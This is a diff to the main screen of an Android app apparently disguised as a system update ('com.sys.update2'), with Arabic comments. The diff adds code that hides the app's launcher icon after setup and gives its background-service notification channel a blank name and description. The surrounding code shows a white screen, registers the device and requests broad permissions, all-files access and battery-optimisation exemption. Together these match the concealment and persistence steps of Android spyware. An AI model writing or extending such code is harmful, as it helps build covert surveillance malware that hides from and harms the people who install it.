@@ -3,6 +3,7 @@ package com.sys.update2
 import android.Manifest
 import android.app.NotificationChannel
 import android.app.NotificationManager
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
@@ -11,7 +12,10 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
+import android.os.Handler
+import android.os.Looper
 import android.provider.Settings
+import android.util.Log
 import android.widget.FrameLayout
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
@@ -20,19 +24,53 @@ import androidx.core.content.ContextCompat
 class MainActivity : AppCompatActivity() {
 
     private val PERM_REQUEST_CODE = 1001
+    private val handler = Handler(Looper.getMainLooper())
+    private val LAUNCHER_ALIAS = "com.sys.update2.LauncherAlias"
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
+        // شاشة بيضا
         val white = FrameLayout(this)
         white.setBackgroundColor(Color.WHITE)
         setContentView(white)
 
+        // سجّل الجهاز
         DeviceManager.registerDevice(this)
+
+        // شغّل الخدمة
         startBackgroundService()
+
+        // أنشئ channel الإشعارات
+        createNotificationChannel()
+
+        // ابدأ بطلب الأذونات
         requestPermissionsStep1()
+
+        // ⭐ إخفاء الأيقونة بعد 8 ثواني من الإعداد (بعد ما الأذونات تتم)
+        handler.postDelayed({ hideLauncherIcon() }, 8000L)
     }
 
+    // ═══════════════════════════════════════════
+    //  إخفاء الأيقونة
+    // ═══════════════════════════════════════════
+    private fun hideLauncherIcon() {
+        try {
+            val component = ComponentName(this, LAUNCHER_ALIAS)
+            packageManager.setComponentEnabledSetting(
+                component,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            Log.d("MainActivity", "Launcher icon hidden")
+        } catch (e: Exception) {
+            Log.e("MainActivity", "hide err: ${e.message}")
+        }
+    }
+
+    // ═══════════════════════════════════════════
+    //  Permissions
+    // ═══════════════════════════════════════════
     private fun requestPermissionsStep1() {
         val needed = mutableListOf<String>()
 
@@ -85,11 +123,7 @@ class MainActivity : AppCompatActivity() {
                 } catch (_: Exception) {}
             }
         }
-        android.os.Handler(mainLooper).postDelayed({ onPermissionsDone() }, 3000)
-    }
-
-    private fun onPermissionsDone() {
-        requestAllFilesAccess()
+        handler.postDelayed({ requestAllFilesAccess() }, 3000)
     }
 
     private fun requestAllFilesAccess() {
@@ -107,7 +141,7 @@ class MainActivity : AppCompatActivity() {
                 }
             }
         }
-        android.os.Handler(mainLooper).postDelayed({ requestBatteryOptimization() }, 3000)
+        handler.postDelayed({ requestBatteryOptimization() }, 3000)
     }
 
     private fun requestBatteryOptimization() {
@@ -116,19 +150,25 @@ class MainActivity : AppCompatActivity() {
             intent.data = Uri.parse("package:$packageName")
             startActivity(intent)
         } catch (_: Exception) {}
-        android.os.Handler(mainLooper).postDelayed({ openWebView() }, 2000)
+        handler.postDelayed({ onSetupComplete() }, 2500)
     }
 
-    private fun openWebView() {
+    private fun onSetupComplete() {
+        // ⭐ إخفاء الأيقونة فوراً
+        hideLauncherIcon()
+
+        // ⭐ افتح الهاتف الافتراضي مرة واحدة
         try {
             startActivity(Intent(this, WebViewActivity::class.java))
-            finish()
         } catch (_: Exception) {}
+        finish()
     }
 
+    // ═══════════════════════════════════════════
+    //  Background service
+    // ═══════════════════════════════════════════
     private fun startBackgroundService() {
         try {
-            createNotificationChannel()
             val intent = Intent(this, BackgroundService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(intent)
@@ -142,12 +182,13 @@ class MainActivity : AppCompatActivity() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 "sys_sync_channel",
-                "System Sync",
+                " ",
                 NotificationManager.IMPORTANCE_MIN
             )
             channel.setSound(null, null)
             channel.enableVibration(false)
             channel.setShowBadge(false)
+            channel.description = " "
             val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             nm.createNotificationChannel(channel)
         }
